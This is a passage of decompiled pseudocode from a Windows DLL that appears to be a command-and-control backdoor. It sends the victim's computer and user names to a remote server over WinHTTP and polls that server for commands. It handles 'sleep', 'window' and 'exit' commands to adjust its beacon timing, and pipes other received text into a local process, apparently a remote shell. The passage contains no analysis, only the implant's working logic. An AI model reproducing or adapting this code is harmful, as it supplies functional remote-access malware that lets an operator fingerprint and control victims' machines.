    "  DWORD nNumberOfBytesToWrite[2]; // [rsp+E8h] [rbp-20h]",
    "  unsigned __int64 v101; // [rsp+F0h] [rbp-18h]",
    "  _DWORD Buffer[4]; // [rsp+F8h] [rbp-10h] BYREF",
    "  _QWORD v103[2]; // [rsp+108h] [rbp+0h] BYREF",
    "  _BYTE v104[128]; // [rsp+118h] [rbp+10h] BYREF",
    "  _QWORD v105[12]; // [rsp+198h] [rbp+90h] BYREF",
    "",
    "  v0 = 0;",
    "  GetComputerNameW(&::Buffer, (LPDWORD)&pcbBuffer);",
    "  LODWORD(pcbBuffer) = 100;",
    "  GetUserNameW(&word_18004DF50, (LPDWORD)&pcbBuffer);",
    "  wsprintfW(&pwszObjectName, L\"search:%s_%s\", &::Buffer, &word_18004DF50);",
    "  if ( hInternet )",
    "  {",
    "    v1 = WinHttpOpenRequest(hInternet, L\"GET\", &pwszObjectName, 0, 0, 0, 0x800000u);",
    "    qword_18004E1A8 = v1;",
    "  }",
    "  else",
    "  {",
    "    v1 = qword_18004E1A8;",
    "  }",
    "  Buffer[0] = 12544;",
    "  WinHttpSetOption(v1, 0x1Fu, Buffer, 4u);",
    "  v2 = qword_18004E1A8;",
    "  if ( qword_18004E1A8 )",
    "  {",
    "    v3 = WinHttpSendRequest(qword_18004E1A8, 0, 0, 0, 0, 0, 0);",
    "    dword_18004DF48 = v3;",
    "    v2 = qword_18004E1A8;",
    "  }",
    "  else",
    "  {",
    "    v3 = dword_18004DF48;",
    "  }",
    "  if ( !v3 )",
    "    return 1;",
    "  dword_18004DF48 = WinHttpReceiveResponse(v2, 0);",
    "  LODWORD(dwNumberOfBytesAvailable) = 0;",
    "  WinHttpQueryDataAvailable(qword_18004E1A8, (LPDWORD)&dwNumberOfBytesAvailable);",
    "  sub_180006C20(&lpBuffer, (unsigned int)dwNumberOfBytesAvailable, 0);",
    "  p_lpBuffer = &lpBuffer;",
    "  if ( v101 > 0xF )",
    "    p_lpBuffer = (__int128 *)lpBuffer;",
    "  WinHttpReadData(qword_18004E1A8, p_lpBuffer, dwNumberOfBytesAvailable, 0);",
    "  v5 = &lpBuffer;",
    "  v6 = (__int128 *)lpBuffer;",
    "  v7 = v101;",
    "  if ( v101 > 0xF )",
    "    v5 = (__int128 *)lpBuffer;",
    "  v8 = *(_QWORD *)nNumberOfBytesToWrite;",
    "  if ( *(_QWORD *)nNumberOfBytesToWrite >= 6u )",
    "  {",
    "    for ( i = v5;",
    "          *(_BYTE *)i != 115 || *(_DWORD *)i != 1701145715 || *((_WORD *)i + 2) != 8304;",
    "          i = (__int128 *)((char *)i - 1) )",
    "    {",
    "      if ( i == v5 )",
    "        goto LABEL_53;",
    "    }",
    "    if ( i == v5 )",
    "    {",
    "      sub_1800368A0(v103, 0, 240);",
    "      v86 = 0;",
    "      si128 = 0;",
    "      if ( v8 < 6 )",
    "        std::vector<void *>::_Xlen();",
    "      v10 = &lpBuffer;",
    "      if ( v7 > 0xF )",
    "        v10 = v6;",
    "      sub_18000A3D0(&v86, (char *)v10 + 6, v8 - 6);",
    "      sub_180006AA0(v103, &v86);",
    "      if ( si128.m128i_i64[1] > 0xFuLL )",
    "      {",
    "        v11 = si128.m128i_i64[1] + 1;",
    "        v12 = v86.m128i_i64[0];",
    "        if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "        {",
    "          v11 = si128.m128i_i64[1] + 40;",
    "          v12 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "          if ( (unsigned __int64)(v86.m128i_i64[0] - v12 - 8) > 0x1F )",
    "            goto LABEL_185;",
    "        }",
    "        sub_1800116E0(v12, v11);",
    "      }",
    "      v98 = dword_18004BCC8;",
    "      sub_18000A0A0(v103, &v98);",
    "      dword_18004BCC8 = v98;",
    "      if ( (v104[*(int *)(v103[0] + 4LL)] & 6) != 0 )",
    "      {",
    "        v28 = sub_180009C20(&qword_18004C7A0, \"Invalid time provided after 'sleep'\");",
    "        sub_180009ED0(v28);",
    "        goto LABEL_52;",
    "      }",
    "      sub_180009A40(v88);",
    "      v14 = v89;",
    "      if ( v90 - v89 < 0xD )",
    "      {",
    "        v17 = (__m128i *)sub_18000F8D0((unsigned int)v88, 13, v89, v13, (__int64)\"Sleeping for \", 13);",
    "      }",
    "      else",
    "      {",
    "        v89 += 13;",
    "        v15 = (const char *)v88;",
    "        if ( v90 > 0xF )",
    "          v15 = (const char *)v88[0];",
    "        if ( \"\" <= v15 || \"Sleeping for \" > &v15[v14] )",
    "        {",
    "          v16 = 13;",
    "        }",
    "        else if ( v15 > \"Sleeping for \" )",
    "        {",
    "          v16 = v15 - \"Sleeping for \";",
    "        }",
    "        else",
    "        {",
    "          v16 = 0;",
    "        }",
    "        sub_180036160(v15 + 13, v15, v14 + 1);",
    "        sub_180036160(v15, \"Sleeping for \", v16);",
    "        sub_180036160(&v15[v16], &aSleepingFor[v16 + 13], 13 - v16);",
    "        v17 = (__m128i *)v88;",
    "      }",
    "      v86 = 0;",
    "      si128 = 0;",
    "      v86 = *v17;",
    "      si128 = v17[1];",
    "      v17[1].m128i_i64[0] = 0;",
    "      v17[1].m128i_i64[1] = 15;",
    "      v17->m128i_i8[0] = 0;",
    "      v18 = sub_180008910(&v86, \" minutes.\", 9);",
    "      v19 = *(_OWORD *)v18;",
    "      v20 = *(__m128i *)(v18 + 16);",
    "      *(_QWORD *)(v18 + 16) = 0;",
    "      *(_QWORD *)(v18 + 24) = 15;",
    "      *(_BYTE *)v18 = 0;",
    "      if ( si128.m128i_i64[1] > 0xFuLL )",
    "      {",
    "        v21 = si128.m128i_i64[1] + 1;",
    "        v22 = v86.m128i_i64[0];",
    "        if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "        {",
    "          v21 = si128.m128i_i64[1] + 40;",
    "          v22 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "          if ( (unsigned __int64)(v86.m128i_i64[0] - v22 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v22, v21);",
    "      }",
    "      si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "      v86.m128i_i8[0] = 0;",
    "      if ( v90 > 0xF )",
    "      {",
    "        v23 = v90 + 1;",
    "        v24 = v88[0];",
    "        if ( v90 + 1 >= 0x1000 )",
    "        {",
    "          v23 = v90 + 40;",
    "          v24 = *(_QWORD *)(v88[0] - 8LL);",
    "          if ( (unsigned __int64)(v88[0] - v24 - 8) > 0x1F )",
    "            invalid_parameter_noinfo_noreturn();",
    "        }",
    "        sub_1800116E0(v24, v23);",
    "      }",
    "      v25 = _mm_srli_si128(v20, 8).m128i_u64[0];",
    "      if ( v25 <= 0xF )",
    "        goto LABEL_52;",
    "      v26 = v25 + 1;",
    "      v27 = v19;",
    "      if ( v25 + 1 < 0x1000 || (v26 = v25 + 40, v27 = *(_QWORD *)(v19 - 8), (unsigned __int64)(v19 - v27 - 8) <= 0x1F) )",
    "      {",
    "        sub_1800116E0(v27, v26);",
    "LABEL_52:",
    "        *(_QWORD *)((char *)v103 + *(int *)(v103[0] + 4LL)) = &off_180044A98;",
    "        *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 144;",
    "        sub_180006730(v104);",
    "        *(_QWORD *)((char *)v103 + *(int *)(v103[0] + 4LL)) = &off_180044A80;",
    "        *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 24;",
    "        v105[0] = &off_18003A520;",
    "        sub_1800108D0(v105);",
    "        v7 = v101;",
    "        v8 = *(_QWORD *)nNumberOfBytesToWrite;",
    "        v6 = (__int128 *)lpBuffer;",
    "        goto LABEL_57;",
    "      }",
    "LABEL_185:",
    "      invalid_parameter_noinfo_noreturn();",
    "    }",
    "  }",
    "LABEL_53:",
    "  v29 = &lpBuffer;",
    "  if ( v101 > 0xF )",
    "    v29 = (__int128 *)lpBuffer;",
    "  if ( *(_QWORD *)nNumberOfBytesToWrite == 5 && !(unsigned int)sub_180036C40(v29, \"exit\\n\", 5) )",
    "    goto LABEL_175;",
    "LABEL_57:",
    "  v30 = &lpBuffer;",
    "  if ( v7 > 0xF )",
    "    v30 = v6;",
    "  if ( v8 < 9 )",
    "    goto LABEL_100;",
    "  for ( j = v30;",
    "        *(_BYTE *)j != 110 || *(_QWORD *)j != 0x65656C737478656ELL || *((_BYTE *)j + 8) != 112;",
    "        j = (__int128 *)((char *)j - 1) )",
    "  {",
    "    if ( j == v30 )",
    "      goto LABEL_100;",
    "  }",
    "  if ( j != v30 )",
    "  {",
    "LABEL_100:",
    "    v51 = &lpBuffer;",
    "    if ( v7 > 0xF )",
    "      v51 = v6;",
    "    if ( v8 < 7 )",
    "      goto LABEL_143;",
    "    for ( k = v51;",
    "          *(_BYTE *)k != 119 || *(_DWORD *)k != 1684957559 || *((_WORD *)k + 2) != 30575 || *((_BYTE *)k + 6) != 32;",
    "          k = (__int128 *)((char *)k - 1) )",
    "    {",
    "      if ( k == v51 )",
    "        goto LABEL_143;",
    "    }",
    "    if ( k != v51 )",
    "    {",
    "LABEL_143:",
    "      v70 = &lpBuffer;",
    "      if ( v7 > 0xF )",
    "        v70 = v6;",
    "      if ( v8 < 0xC )",
    "        goto LABEL_162;",
    "      for ( m = v70;",
    "            *(_BYTE *)m != 119 || *(_QWORD *)m != 0x6C73776F646E6977LL || *((_DWORD *)m + 2) != 544236901;",
    "            m = (__int128 *)((char *)m - 1) )",
    "      {",
    "        if ( m == v70 )",
    "          goto LABEL_162;",
    "      }",
    "      if ( m == v70 )",
    "      {",
    "        sub_1800368A0(v103, 0, 240);",
    "        v86 = 0;",
    "        si128 = 0;",
    "        v72 = &lpBuffer;",
    "        if ( v7 > 0xF )",
    "          v72 = v6;",
    "        sub_18000A3D0(&v86, (char *)v72 + 12, v8 - 12);",
    "        sub_180006AA0(v103, &v86);",
    "        if ( si128.m128i_i64[1] > 0xFuLL )",
    "        {",
    "          v73 = si128.m128i_i64[1] + 1;",
    "          v74 = v86.m128i_i64[0];",
    "          if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "          {",
    "            v73 = si128.m128i_i64[1] + 40;",
    "            v74 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "            if ( (unsigned __int64)(v86.m128i_i64[0] - v74 - 8) > 0x1F )",
    "              invalid_parameter_noinfo_noreturn();",
    "          }",
    "          sub_1800116E0(v74, v73);",
    "        }",
    "        v98 = 0;",
    "        sub_18000A0A0(v103, &v98);",
    "        v75 = *(int *)(v103[0] + 4LL);",
    "        if ( (v104[v75] & 6) == 0 )",
    "          dword_18004BCC4 = v98;",
    "        *(_QWORD *)((char *)v103 + v75) = &off_180044A98;",
    "        *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 144;",
    "        sub_180006730(v104);",
    "        *(_QWORD *)((char *)v103 + *(int *)(v103[0] + 4LL)) = &off_180044A80;",
    "        *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 24;",
    "        v105[0] = &off_18003A520;",
    "        sub_1800108D0(v105);",
    "      }",
    "      else",
    "      {",
    "LABEL_162:",
    "        v76 = sub_180009C20(&qword_18004C8C0, \"Received message: \");",
    "        v77 = &lpBuffer;",
    "        if ( v101 > 0xF )",
    "          v77 = (__int128 *)lpBuffer;",
    "        v78 = sub_18000D0A0(v76, v77, *(_QWORD *)nNumberOfBytesToWrite);",
    "        sub_180009ED0(v78);",
    "      }",
    "      goto LABEL_165;",
    "    }",
    "    sub_1800368A0(v103, 0, 240);",
    "    v86 = 0;",
    "    si128 = 0;",
    "    v53 = &lpBuffer;",
    "    if ( v7 > 0xF )",
    "      v53 = v6;",
    "    sub_18000A3D0(&v86, (char *)v53 + 7, v8 - 7);",
    "    sub_180006AA0(v103, &v86);",
    "    if ( si128.m128i_i64[1] > 0xFuLL )",
    "    {",
    "      v54 = si128.m128i_i64[1] + 1;",
    "      v55 = v86.m128i_i64[0];",
    "      if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "      {",
    "        v54 = si128.m128i_i64[1] + 40;",
    "        v55 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "        if ( (unsigned __int64)(v86.m128i_i64[0] - v55 - 8) > 0x1F )",
    "          goto LABEL_192;",
    "      }",
    "      sub_1800116E0(v55, v54);",
    "    }",
    "    v98 = dword_18004E018;",
    "    sub_18000A0A0(v103, &v98);",
    "    dword_18004E018 = v98;",
    "    if ( (v104[*(int *)(v103[0] + 4LL)] & 6) != 0 )",
    "    {",
    "      v69 = sub_180009C20(&qword_18004C7A0, \"Invalid time provided after 'window'\");",
    "      sub_180009ED0(v69);",
    "      goto LABEL_99;",
    "    }",
    "    byte_18004DE78 = 1;",
    "    byte_18004BCCC = 1;",
    "    sub_180009A40(v94);",
    "    v57 = v95;",
    "    if ( v96 - v95 < 0x1F )",
    "    {",
    "      v60 = (__m128i *)sub_18000F8D0((unsigned int)v94, 31, v95, v56, (__int64)\"Sleep is disabled for the next \", 31);",
    "    }",
    "    else",
    "    {",
    "      v95 += 31;",
    "      v58 = (const char *)v94;",
    "      if ( v96 > 0xF )",
    "        v58 = (const char *)v94[0];",
    "      if ( \"\" <= v58 || \"Sleep is disabled for the next \" > &v58[v57] )",
    "      {",
    "        v59 = 31;",
    "      }",
    "      else if ( v58 > \"Sleep is disabled for the next \" )",
    "      {",
    "        v59 = v58 - \"Sleep is disabled for the next \";",
    "      }",
    "      else",
    "      {",
    "        v59 = 0;",
    "      }",
    "      sub_180036160(v58 + 31, v58, v57 + 1);",
    "      sub_180036160(v58, \"Sleep is disabled for the next \", v59);",
    "      sub_180036160(&v58[v59], &aSleepIsDisable[v59 + 31], 31 - v59);",
    "      v60 = (__m128i *)v94;",
    "    }",
    "    v86 = 0;",
    "    si128 = 0;",
    "    v86 = *v60;",
    "    si128 = v60[1];",
    "    v60[1].m128i_i64[0] = 0;",
    "    v60[1].m128i_i64[1] = 15;",
    "    v60->m128i_i8[0] = 0;",
    "    v61 = sub_180008910(&v86, \" minutes.\", 9);",
    "    v62 = *(_OWORD *)v61;",
    "    v63 = *(__m128i *)(v61 + 16);",
    "    *(_QWORD *)(v61 + 16) = 0;",
    "    *(_QWORD *)(v61 + 24) = 15;",
    "    *(_BYTE *)v61 = 0;",
    "    if ( si128.m128i_i64[1] > 0xFuLL )",
    "    {",
    "      v64 = si128.m128i_i64[1] + 1;",
    "      v65 = v86.m128i_i64[0];",
    "      if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "      {",
    "        v64 = si128.m128i_i64[1] + 40;",
    "        v65 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "        if ( (unsigned __int64)(v86.m128i_i64[0] - v65 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v65, v64);",
    "    }",
    "    si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "    v86.m128i_i8[0] = 0;",
    "    if ( v96 > 0xF )",
    "    {",
    "      v66 = v96 + 1;",
    "      v67 = v94[0];",
    "      if ( v96 + 1 >= 0x1000 )",
    "      {",
    "        v66 = v96 + 40;",
    "        v67 = *(_QWORD *)(v94[0] - 8LL);",
    "        if ( (unsigned __int64)(v94[0] - v67 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v67, v66);",
    "    }",
    "    v68 = _mm_srli_si128(v63, 8).m128i_u64[0];",
    "    if ( v68 <= 0xF )",
    "      goto LABEL_99;",
    "    v48 = v68 + 1;",
    "    v49 = v62;",
    "    if ( v68 + 1 < 0x1000 )",
    "      goto LABEL_97;",
    "    v48 = v68 + 40;",
    "    v49 = *(_QWORD *)(v62 - 8);",
    "    if ( (unsigned __int64)(v62 - v49 - 8) <= 0x1F )",
    "      goto LABEL_97;",
    "LABEL_192:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "  sub_1800368A0(v103, 0, 240);",
    "  v86 = 0;",
    "  si128 = 0;",
    "  if ( v8 < 0xA )",
    "    std::vector<void *>::_Xlen();",
    "  v32 = &lpBuffer;",
    "  if ( v7 > 0xF )",
    "    v32 = v6;",
    "  sub_18000A3D0(&v86, (char *)v32 + 10, v8 - 10);",
    "  sub_180006AA0(v103, &v86);",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v33 = si128.m128i_i64[1] + 1;",
    "    v34 = v86.m128i_i64[0];",
    "    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v33 = si128.m128i_i64[1] + 40;",
    "      v34 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "      if ( (unsigned __int64)(v86.m128i_i64[0] - v34 - 8) > 0x1F )",
    "        goto LABEL_189;",
    "    }",
    "    sub_1800116E0(v34, v33);",
    "  }",
    "  v98 = dword_18004E0F8;",
    "  sub_18000A0A0(v103, &v98);",
    "  dword_18004E0F8 = v98;",
    "  if ( (v104[*(int *)(v103[0] + 4LL)] & 6) != 0 )",
    "  {",
    "    v50 = sub_180009C20(&qword_18004C7A0, \"Invalid time provided after 'sleep'\");",
    "    sub_180009ED0(v50);",
    "    goto LABEL_99;",
    "  }",
    "  sub_180009A40(v91);",
    "  v36 = v92;",
    "  if ( v93 - v92 < 0xD )",
    "  {",
    "    v39 = (__m128i *)sub_18000F8D0((unsigned int)v91, 13, v92, v35, (__int64)\"Sleeping for \", 13);",
    "  }",
    "  else",
    "  {",
    "    v92 += 13;",
    "    v37 = (const char *)v91;",
    "    if ( v93 > 0xF )",
    "      v37 = (const char *)v91[0];",
    "    if ( \"\" <= v37 || \"Sleeping for \" > &v37[v36] )",
    "    {",
    "      v38 = 13;",
    "    }",
    "    else if ( v37 > \"Sleeping for \" )",
    "    {",
    "      v38 = v37 - \"Sleeping for \";",
    "    }",
    "    else",
    "    {",
    "      v38 = 0;",
    "    }",
    "    sub_180036160(v37 + 13, v37, v36 + 1);",
    "    sub_180036160(v37, \"Sleeping for \", v38);",
    "    sub_180036160(&v37[v38], &aSleepingFor[v38 + 13], 13 - v38);",
    "    v39 = (__m128i *)v91;",
    "  }",
    "  v86 = 0;",
    "  si128 = 0;",
    "  v86 = *v39;",
    "  si128 = v39[1];",
    "  v39[1].m128i_i64[0] = 0;",
    "  v39[1].m128i_i64[1] = 15;",
    "  v39->m128i_i8[0] = 0;",
    "  v40 = sub_180008910(&v86, \" minutes.\", 9);",
    "  v41 = *(_OWORD *)v40;",
    "  v42 = *(__m128i *)(v40 + 16);",
    "  *(_QWORD *)(v40 + 16) = 0;",
    "  *(_QWORD *)(v40 + 24) = 15;",
    "  *(_BYTE *)v40 = 0;",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v43 = si128.m128i_i64[1] + 1;",
    "    v44 = v86.m128i_i64[0];",
    "    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v43 = si128.m128i_i64[1] + 40;",
    "      v44 = *(_QWORD *)(v86.m128i_i64[0] - 8);",
    "      if ( (unsigned __int64)(v86.m128i_i64[0] - v44 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v44, v43);",
    "  }",
    "  si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  v86.m128i_i8[0] = 0;",
    "  if ( v93 > 0xF )",
    "  {",
    "    v45 = v93 + 1;",
    "    v46 = v91[0];",
    "    if ( v93 + 1 >= 0x1000 )",
    "    {",
    "      v45 = v93 + 40;",
    "      v46 = *(_QWORD *)(v91[0] - 8LL);",
    "      if ( (unsigned __int64)(v91[0] - v46 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v46, v45);",
    "  }",
    "  byte_18004BCCC = 0;",
    "  v47 = _mm_srli_si128(v42, 8).m128i_u64[0];",
    "  if ( v47 <= 0xF )",
    "    goto LABEL_99;",
    "  v48 = v47 + 1;",
    "  v49 = v41;",
    "  if ( v47 + 1 >= 0x1000 )",
    "  {",
    "    v48 = v47 + 40;",
    "    v49 = *(_QWORD *)(v41 - 8);",
    "    if ( (unsigned __int64)(v41 - v49 - 8) > 0x1F )",
    "LABEL_189:",
    "      invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_97:",
    "  sub_1800116E0(v49, v48);",
    "LABEL_99:",
    "  *(_QWORD *)((char *)v103 + *(int *)(v103[0] + 4LL)) = &off_180044A98;",
    "  *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 144;",
    "  sub_180006730(v104);",
    "  *(_QWORD *)((char *)v103 + *(int *)(v103[0] + 4LL)) = &off_180044A80;",
    "  *(_DWORD *)((char *)&Buffer[3] + *(int *)(v103[0] + 4LL)) = *(_DWORD *)(v103[0] + 4LL) - 24;",
    "  v105[0] = &off_18003A520;",
    "  sub_1800108D0(v105);",
    "LABEL_165:",
    "  v79 = &lpBuffer;",
    "  if ( v101 > 0xF )",
    "    v79 = (__int128 *)lpBuffer;",
    "  v80 = WriteFile(hWritePipe, v79, nNumberOfBytesToWrite[0], 0, 0);",
    "  v7 = v101;",
    "  v6 = (__int128 *)lpBuffer;",
    "  if ( v80 )",
    "  {",
    "    v81 = hHandle;",
    "    if ( hHandle )",
    "    {",
    "      v82 = &lpBuffer;",
    "      if ( v101 > 0xF )",
    "        v82 = (__int128 *)lpBuffer;",
    "      if ( *(_QWORD *)nNumberOfBytesToWrite == 5 && !(unsigned int)sub_180036C40(v82, \"tree\\n\", 5) )",
    "      {",
    "        WaitForSingleObject(v81, 0x2710u);",
    "        v7 = v101;",
    "        v6 = (__int128 *)lpBuffer;",
    "      }",
    "    }",
    "    v0 = 2;",
    "  }",
    "LABEL_175:",
    "  if ( v7 > 0xF )",
    "  {",
    "    v83 = v7 + 1;",
    "    v84 = (char *)v6;",
    "    if ( v7 + 1 >= 0x1000 )",
    "    {",
    "      v83 = v7 + 40;",
    "      v6 = (__int128 *)*((_QWORD *)v6 - 1);",
    "      if ( (unsigned __int64)(v84 - (char *)v6 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v6, v83);",
    "  }",
    "  return v0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003250(_QWORD *a1)",
    "{",
    "  _QWORD *v2; // rdi",
    "",
    "  v2 = a1 + 18;",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 144) = &off_180044A98;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 148) = *(_DWORD *)(*a1 + 4LL) - 144;",
    "  sub_180006730(a1 + 2);",
    "  *(_QWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 144) = &off_180044A80;",
    "  *(_DWORD *)((char *)v2 + *(int *)(*a1 + 4LL) - 148) = *(_DWORD *)(*a1 + 4LL) - 24;",
    "  *v2 = &off_18003A520;",
    "  return sub_1800108D0(v2);",
    "}",
    "",
    "",
    "void __fastcall sub_1800032E0(char *a1, INTERNET_PORT a2)",
    "{",
    "  char *v4; // rsi",
    "  unsigned __int64 v5; // rdi",
    "  unsigned __int64 v6; // rsi",
    "  unsigned __int64 v7; // rcx",
    "  __int64 v8; // rax",
    "  __int64 v9; // rcx",
    "  const WCHAR *v10; // rax",
    "  LPCWSTR *v11; // r8",
    "  unsigned __int64 v12; // rdx",
    "  _WORD *v13; // rcx",
    "  __int16 v14; // ax",
    "  const WCHAR *v15; // rdx",
    "  void *v16; // rax",
    "  LPCWSTR v17; // rcx",
    "  unsigned __int64 v18; // rdx",
    "  LPCWSTR pswzServerName[2]; // [rsp+20h] [rbp-48h] BYREF",
    "  unsigned __int64 v20; // [rsp+30h] [rbp-38h]",
    "  __int64 v21; // [rsp+38h] [rbp-30h]",
    "",
    "  Sleep(0x64u);",
    "  if ( hInternet )",
    "  {",
    "    WinHttpCloseHandle(hInternet);",
    "    hInternet = 0;",
    "  }",
    "  if ( *((_QWORD *)a1 + 3) <= 0xFu )",
    "  {",
    "    v4 = &a1[*((_QWORD *)a1 + 2)];",
    "  }",
    "  else",
    "  {",
    "    v4 = (char *)(*((_QWORD *)a1 + 2) + *(_QWORD *)a1);",
    "    a1 = *(char **)a1;",
    "  }",
    "  v5 = 7;",
    "  v21 = 7;",
    "  v20 = 0;",
    "  *(_OWORD *)pswzServerName = 0;",
    "  if ( a1 == v4 )",
    "  {",
    "    LOWORD(pswzServerName[0]) = 0;",
    "    goto LABEL_28;",
    "  }",
    "  v6 = v4 - a1;",
    "  if ( v6 > 0x7FFFFFFFFFFFFFFELL )",
    "    std::vector<void *>::_Xlen();",
    "  if ( v6 <= 7 )",
    "  {",
    "    v10 = pswzServerName[0];",
    "    goto LABEL_23;",
    "  }",
    "  v5 = v6 | 7;",
    "  if ( (v6 | 7) <= 0x7FFFFFFFFFFFFFFELL )",
    "  {",
    "    if ( v5 < 0xA )",
    "      v5 = 10;",
    "    if ( v5 + 1 > 0x7FFFFFFFFFFFFFFFLL )",
    "      goto LABEL_39;",
    "    v7 = 2 * (v5 + 1);",
    "    if ( !v7 )",
    "    {",
    "      v10 = 0;",
    "      v21 = v5;",
    "      pswzServerName[0] = 0;",
    "      goto LABEL_23;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v5 = 0x7FFFFFFFFFFFFFFELL;",
    "    v7 = -2;",
    "  }",
    "  if ( v7 >= 0x1000 )",
    "  {",
    "    if ( v7 + 39 >= v7 )",
    "    {",
    "      v8 = sub_180011714(v7 + 39);",
    "      v9 = v8;",
    "      if ( !v8 )",
    "        goto LABEL_37;",
    "      v10 = (const WCHAR *)((v8 + 39) & 0xFFFFFFFFFFFFFFE0uLL);",
    "      *((_QWORD *)v10 - 1) = v9;",
    "      pswzServerName[0] = v10;",
    "      v21 = v5;",
    "      goto LABEL_23;",
    "    }",
    "LABEL_39:",
    "    Concurrency::cancel_current_task();",
    "  }",
    "  v10 = (const WCHAR *)sub_180011714(v7);",
    "  pswzServerName[0] = v10;",
    "  v21 = v5;",
    "LABEL_23:",
    "  v11 = pswzServerName;",
    "  v12 = v6;",
    "  if ( v5 > 7 )",
    "    v11 = (LPCWSTR *)v10;",
    "  v13 = v11;",
    "  if ( v6 )",
    "  {",
    "    do",
    "    {",
    "      v14 = *a1++;",
    "      *v13++ = v14;",
    "      --v12;",
    "    }",
    "    while ( v12 );",
    "  }",
    "  v20 = v6;",
    "  *((_WORD *)v11 + v6) = 0;",
    "  v5 = v21;",
    "LABEL_28:",
    "  if ( hSession )",
    "  {",
    "    v15 = (const WCHAR *)pswzServerName;",
    "    if ( v5 > 7 )",
    "      v15 = pswzServerName[0];",
    "    v16 = WinHttpConnect(hSession, v15, a2, 0);",
    "    v5 = v21;",
    "    hInternet = v16;",
    "  }",
    "  if ( v5 > 7 )",
    "  {",
    "    v17 = pswzServerName[0];",
    "    v18 = 2 * v5 + 2;",
    "    if ( v18 < 0x1000",
    "      || (v17 = (LPCWSTR)*((_QWORD *)pswzServerName[0] - 1),",
    "          v18 = 2 * v5 + 41,",
    "          (unsigned __int64)((char *)pswzServerName[0] - (char *)v17 - 8) <= 0x1F) )",
    "    {",
    "      sub_1800116E0(v17, v18);",
    "      return;",
    "    }",
    "LABEL_37:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003520(__int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v4; // r9",
    "  char v5; // cl",
    "  _QWORD *v6; // rsi",
    "  _QWORD *v7; // rbx",
    "  _QWORD *v8; // rdx",
    "  __int64 v9; // rax",
    "  unsigned __int64 v10; // r8",
    "  __int64 v11; // rdx",
    "  __int64 v12; // r8",
    "  __int64 v14; // [rsp+48h] [rbp-B8h]",
    "  _QWORD v15[2]; // [rsp+50h] [rbp-B0h] BYREF",
    "  int *v16; // [rsp+60h] [rbp-A0h] BYREF",
    "  _QWORD v17[3]; // [rsp+68h] [rbp-98h] BYREF",
    "  __int64 *v18; // [rsp+80h] [rbp-80h]",
    "  __int64 *v19; // [rsp+88h] [rbp-78h]",
    "  _QWORD *v20; // [rsp+A0h] [rbp-60h]",
    "  unsigned __int64 *v21; // [rsp+A8h] [rbp-58h]",
    "  int *v22; // [rsp+B8h] [rbp-48h]",
    "  unsigned __int64 v23; // [rsp+D0h] [rbp-30h]",
    "  int v24; // [rsp+D8h] [rbp-28h]",
    "  void **v25; // [rsp+E8h] [rbp-18h]",
    "  __int64 v26; // [rsp+F0h] [rbp-10h]",
    "  __int64 v27; // [rsp+F8h] [rbp-8h]",
    "  int v28; // [rsp+100h] [rbp+0h]",
    "  __int64 v29; // [rsp+108h] [rbp+8h]",
    "  __int128 v30; // [rsp+110h] [rbp+10h]",
    "  __int128 v31; // [rsp+120h] [rbp+20h]",
    "  __int128 v32; // [rsp+130h] [rbp+30h]",
    "  char v33; // [rsp+140h] [rbp+40h]",
    "",
    "  HIDWORD(v14) = HIDWORD(a1);",
    "  sub_1800368A0(v15, 0, 248);",
    "  v15[0] = &unk_180044B38;",
    "  v16 = (int *)&unk_180044B30;",
    "  v26 = 0;",
    "  v27 = 0;",
    "  v28 = 0;",
    "  v29 = 0;",
    "  v30 = 0;",
    "  v31 = 0;",
    "  v25 = &off_18003A530;",
    "  v32 = 0;",
